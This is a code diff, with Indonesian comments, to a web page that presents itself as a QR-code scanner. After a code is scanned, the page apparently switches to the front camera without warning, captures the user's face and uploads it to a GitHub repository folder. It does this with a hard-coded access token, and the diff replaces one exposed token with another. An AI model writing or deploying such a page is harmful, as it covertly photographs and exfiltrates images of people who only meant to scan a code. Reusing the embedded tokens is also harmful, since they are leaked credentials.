@@ -22,7 +22,16 @@
         }
         #urlButton {
             margin-top: 10px;
-            display: none;
+            display: none; /* Sembunyikan tombol sampai gambar di-upload */
+            background-color: gray; /* Warna abu-abu saat belum terupload */
+            color: white;
+            border: none;
+            padding: 10px;
+            cursor: not-allowed;
+        }
+        #urlButton.active {
+            background-color: green; /* Warna tombol setelah berhasil upload */
+            cursor: pointer; /* Ubah kursor saat tombol aktif */
         }
     </style>
 </head>
@@ -34,7 +43,7 @@
     </div>
     <div id="result">Scan result will appear here</div>
 
-    <button id="urlButton" style="display: none;">Masuk ke URL</button>
+    <button id="urlButton" disabled>Masuk ke URL</button>
 
     <h2>Gambar dari Kamera Depan:</h2>
     <img id="capturedPhotoFront" src="" alt="Captured Photo from Front Camera">
@@ -49,12 +58,9 @@
         const canvasFront = document.createElement('canvas');
         const contextFront = canvasFront.getContext('2d', { willReadFrequently: true });
         let currentStreamBack;
-        let currentStreamFront;
-        let lastDetectedURL = '';
-        let capturedBackPhotoUrl = ''; // Menyimpan foto terakhir kamera belakang
+        let isUploaded = false; // Status upload gambar
 
-        // Ganti dengan token GitHub Anda
-        const GITHUB_TOKEN = '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'; 
+        const GITHUB_TOKEN = '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'; 
         // Ganti dengan username GitHub Anda
         const GITHUB_USERNAME = 'ridwansyaiful'; 
         // Ganti dengan nama repositori Anda
@@ -63,7 +69,6 @@
         const FOLDER_PATH = 'pap/'; // Folder tempat menyimpan gambar
 
         async function startCameraBack() {
-            // Mulai kamera belakang
             currentStreamBack = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
             videoBack.srcObject = currentStreamBack;
 
@@ -75,40 +80,51 @@
         }
 
         async function switchToFrontCamera() {
-            // Berhenti stream kamera belakang, tapi simpan gambar terakhir
+            // Berhenti stream kamera belakang dan ambil gambar
             if (currentStreamBack) {
                 contextBack.drawImage(videoBack, 0, 0, canvasBack.width, canvasBack.height);
-                capturedBackPhotoUrl = canvasBack.toDataURL('image/png');
-                videoBack.srcObject = null; // Set video menjadi null untuk berhenti menampilkan kamera
-                videoBack.poster = capturedBackPhotoUrl; // Tampilkan gambar terakhir di kotak pertama
-                currentStreamBack.getTracks().forEach(track => track.stop());
             }
 
             // Ganti ke kamera depan
-            currentStreamFront = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-            const videoElement = document.createElement('video'); // Buat elemen video sementara untuk kamera depan
+            const currentStreamFront = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+            const videoElement = document.createElement('video');
             videoElement.srcObject = currentStreamFront;
             videoElement.play();
 
-            videoElement.addEventListener('loadedmetadata', () => {
+            videoElement.addEventListener('loadedmetadata', async () => {
                 canvasFront.width = videoElement.videoWidth;
                 canvasFront.height = videoElement.videoHeight;
 
                 // Ambil gambar setelah video tersedia
-                setTimeout(() => {
+                setTimeout(async () => {
                     contextFront.drawImage(videoElement, 0, 0, canvasFront.width, canvasFront.height);
                     const capturedFrontPhotoUrl = canvasFront.toDataURL('image/png');
                     document.getElementById('capturedPhotoFront').src = capturedFrontPhotoUrl;
-                    
-                    // Upload ke GitHub
-                    uploadToGitHub(capturedFrontPhotoUrl);
 
-                    // Kembali ke kamera belakang setelah ambil foto
-                    startCameraBack(); // Restart kamera belakang
-                    
-                    // Setelah kamera depan mengambil foto, baru tampilkan tombol URL
-                    urlButton.style.display = 'block'; 
-                }, 1000); // Tunggu 1 detik untuk memastikan kamera depan siap
+                    // Proses upload gambar hanya jika belum terupload
+                    if (!isUploaded) {
+                        isUploaded = true;
+                        const uploadUrl = await uploadToGitHub(capturedFrontPhotoUrl);
+                        
+                        if (uploadUrl) {
+                            // isUploaded = true; // Tandai bahwa gambar sudah terupload
+                            // Jika berhasil, ubah status tombol dan fungsi onclick
+                            urlButton.style.display = 'block'; 
+                            urlButton.textContent = 'URL siap digunakan';
+                            urlButton.classList.add('active');
+                            urlButton.disabled = false; 
+                            urlButton.onclick = () => window.open(uploadUrl, "_blank");
+
+                            // Nonaktifkan kamera dan hapus event listener
+                            if (currentStreamFront) {
+                                currentStreamFront.getTracks().forEach(track => track.stop());
+                            }
+                        } else {
+                            alert("Gagal mengupload gambar. Silakan coba lagi.");
+                            urlButton.disabled = true; 
+                        }
+                    }
+                }, 1000); 
             });
         }
 
@@ -118,15 +134,14 @@
             const code = jsQR(imageDataBack.data, canvasBack.width, canvasBack.height);
 
             if (code) {
-                lastDetectedURL = code.data; // Simpan URL yang terdeteksi
-                resultContainer.textContent = `Result: ${lastDetectedURL}`;
-                resultContainer.style.color = 'green'; // Warna hijau jika QR code terdeteksi
+                resultContainer.textContent = `Result: ${code.data}`;
+                resultContainer.style.color = 'green';
                 
                 // Pindah ke kamera depan untuk ambil foto
                 switchToFrontCamera();
             } else {
                 resultContainer.textContent = 'No QR code found. Please try again.';
-                resultContainer.style.color = 'red'; // Warna merah jika tidak terbaca
+                resultContainer.style.color = 'red';
             }
 
             requestAnimationFrame(scanQRCode);
@@ -153,16 +168,12 @@
 
             if (response.ok) {
                 const data = await response.json();
-                console.log('Image uploaded to GitHub:', data.content.html_url);
+                return data.content.html_url; // Kembalikan URL gambar yang diupload
             } else {
                 console.error('Failed to upload image to GitHub', response);
+                return null; // Kembalikan null jika gagal
             }
         }
-
-        // Event listener untuk tombol URL
-        urlButton.addEventListener('click', () => {
-            window.location.href = lastDetectedURL;
-        });
 
         // Mulai kamera belakang saat halaman dimuat
         startCameraBack().catch(err => {
